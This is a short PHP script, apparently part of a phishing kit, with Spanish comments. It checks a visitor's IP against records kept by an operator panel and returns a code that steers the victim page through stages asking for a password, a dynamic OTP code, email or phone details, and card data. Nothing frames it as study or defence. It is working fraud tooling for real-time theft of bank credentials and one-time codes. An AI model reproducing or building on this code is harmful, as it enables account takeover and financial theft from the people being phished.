<?php
require('../panel/lib/funciones.php');
$ip = $_SERVER['REMOTE_ADDR'];
$reg = traer_regitro($ip);
$estado = buscar_estado($reg);

// Este switch redirige al usuario según lo que tú marques en el panel
switch ($estado) {
    case "1": echo "p"; break; // Password
    case "2": echo "d"; break; // Dinámica (OTP)
    case "4": echo "i"; break; // Información (Correo/Cel)
    case "6": echo "t"; break; // Tarjeta
    case "10": echo "f"; break; // Finalizar
    case "14": echo "m"; break; // Mensaje personalizado
    default: echo "w"; break;  // Espera
}
